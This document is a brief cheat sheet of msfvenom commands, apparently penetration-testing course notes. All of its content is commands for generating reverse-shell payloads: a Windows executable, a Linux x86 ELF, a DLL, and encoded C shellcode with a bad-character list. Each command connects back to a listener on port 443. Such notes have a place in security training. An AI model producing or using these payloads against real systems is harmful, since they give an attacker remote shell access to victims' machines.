# For Windows
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=443 EXITFUNC=thread -f exe > binary.exe

# For Debian x84 (Not x64)
msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=123.123.123.123 LPORT=443 -o shell

# Keep in mind that you can encode the payloads

# For a DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=443 -f dll -o beyondhelper.dll

# In the fixing exploits module for a thread
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"